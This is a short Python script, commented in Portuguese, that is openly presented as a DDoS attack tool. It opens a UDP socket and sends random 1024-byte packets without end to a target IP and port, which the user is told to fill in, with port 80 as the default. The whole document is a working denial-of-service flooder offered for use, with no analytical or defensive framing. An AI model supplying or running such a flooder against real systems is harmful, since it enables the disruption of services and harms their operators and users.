import socket
import random

def ddos_attack(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    
    print(f"Iniciando ataque DDoS contra {target_ip}:{target_port}...\n")
    
    while True:
        sock.sendto(bytes, (target_ip, target_port))

# Alvo do ataque
target_ip = "192.168.1.1"  # Coloque o IP do alvo aqui
target_port = 80  # Porta alvo, como HTTP

ddos_attack(target_ip, target_port)
